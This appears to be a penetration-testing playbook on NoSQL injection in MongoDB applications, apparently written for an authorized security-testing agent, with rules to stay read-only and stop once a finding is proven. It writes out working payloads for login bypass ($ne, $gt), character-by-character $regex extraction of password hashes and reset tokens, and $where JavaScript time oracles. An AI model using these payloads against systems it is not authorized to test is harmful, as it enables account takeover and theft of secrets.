# NoSQL injection (MongoDB / Mongoose / anything taking query operators)

## Contents
- Find the sink
- 1. Authentication bypass (the primary payoff — read-only, own-context)
- 2. Blind extraction with `$regex` (read a hash / reset token)
- 3. `$where` / `$expr` JavaScript injection (boolean + time oracle)
- 4. Operator injection in other verbs
- Impact & grading
- Non-destructive

The classic case: a login or search endpoint takes a JSON body (or query string)
and passes user values straight into a Mongo query object, so an attacker can
smuggle a **query operator** (`$ne`, `$gt`, `$regex`, `$where`, `$expr`) where a
string was expected. Two payoffs: **auth bypass** (log in as anyone) and **blind
extraction** (read a hash / reset token char-by-char). Both are read-only.

## Find the sink

- JSON login/search body: `{"username":"…","password":"…"}` — object *values*
  are the injection point.
- Query-string with bracket parsing (Express `qs`, PHP): `user[$ne]=x` parses to
  `{user:{$ne:"x"}}` server-side. Test `?username[$ne]=x&password[$ne]=x`.
- Any endpoint whose response changes with a `$regex` on a field = an oracle.
- Fingerprint: a Mongo error (`MongoError`, `CastError`, `E11000`), `_id` in
  responses, `ObjectId(...)`, Mongoose/`$`-operator hints in the JS bundle.

## 1. Authentication bypass (the primary payoff — read-only, own-context)

Replace the password (or username) string with an always-true operator so the
query matches a record regardless of the real value:

```json
POST /api/login   Content-Type: application/json
{"username":"admin","password":{"$ne":null}}
```
- `$ne:null` / `$ne:""` -> "password not equal to null" = matches -> logs in as
  `admin` if the app returns the first match. `$gt:""` works the same.
- No known username? Make both fields operators to log in as the **first** user
  (often an admin/seed account):
  ```json
  {"username":{"$gt":""},"password":{"$gt":""}}
  ```
- Anchored to a target with `$regex`: `{"username":{"$regex":"^admin"},"password":{"$ne":1}}`.
- Query-string form: `username[$ne]=x&password[$ne]=x`.

This is a rung-2 proof: you authenticated into an account **without its
password**. If it lands you in an admin session, that is the ATO — read one
admin-only object to confirm, don't mutate anything. If it's another *real*
user's account (not a seed/your own), stop at proving the bypass logs *in* and
don't browse their PII on prod (rung 3/5).

## 2. Blind extraction with `$regex` (read a hash / reset token)

When the login/lookup gives a true/false differential (200 vs 401, or a distinct
body), `$regex` is your boolean oracle to read a field char-by-char:

```json
{"username":"admin","password":{"$regex":"^a"}}     -> matches? first char is "a"
{"username":"admin","password":{"$regex":"^ab"}}    -> narrow the next char
...
```
- Anchor with `^`, extend one char at a time; escape regex metacharacters
  (`.^$*+?()[]{}|\`) in the target charset.
- Length via `{"$regex":"^.{40}$"}` type probes.
- Same technique against a `resetToken`/`apiKey`/`_id` field in any collection the
  query touches. Pull the ONE token that proves impact, then stop (rung 3).

## 3. `$where` / `$expr` JavaScript injection (boolean + time oracle)

If the app builds a `$where` with a string (or a mapReduce / `$accumulator`), you
get server-side JS — a boolean and a **time** oracle even when nothing reflects:

- Boolean: `{"$where":"this.password.match(/^a/)"}` or
  `{"$where":"this.username=='admin' && this.password[0]=='a'"}`.
- Time-blind (repeatable, short): `{"$where":"sleep(5000)"}` or
  `{"$where":"this.username=='admin'?sleep(5000):0"}` — confirm 0ms/5000ms/5000ms
  like any time oracle (`detection-fingerprint.md` §4). Keep sleeps ≤5s and few.
- Query-string form where the param is echoed into `$where`:
  `';return sleep(5000)//`.

`$where` is a **read/compute** primitive — never use it to write. Modern Mongo
often disables server-side JS; if `$where` is inert, fall back to `$regex`
extraction (§2).

## 4. Operator injection in other verbs

- `$gt`/`$lt` to bypass ownership filters: an endpoint that scopes with
  `{userId:<you>}` but takes the id from the body -> `{"userId":{"$gt":""}}`
  widens it to all users (this is really an IDOR — hand to `idor-bola`).
- `$in` to enumerate: `{"_id":{"$in":["<id1>","<id2>"]}}`.
- Aggregation `$lookup`/`$expr` injection when a pipeline stage is user-built.

## Impact & grading

- **High/Critical**: auth bypass into an admin/privileged account (ATO), or blind
  extraction of a password hash / live reset token / session.
- **Medium**: operator injection that widens a query to non-sensitive data, or a
  confirmed `$where` oracle with no secret reached yet.
- Never bulk-dump a collection to "show scale" — one bypassed login or one
  extracted token proves the class (rung 3). Convert an extracted secret via
  `exposed-secrets`; convert an id-swap via `idor-bola`.

## Non-destructive

Read-only, own/anon context. Never `$where` that writes, never
`updateOne`/`deleteMany`-style operators, never mass-read another user's records.
Time-based sleeps short and few. If a bypass drops you into a real user's
account, prove entry and stop — don't browse their data on prod.
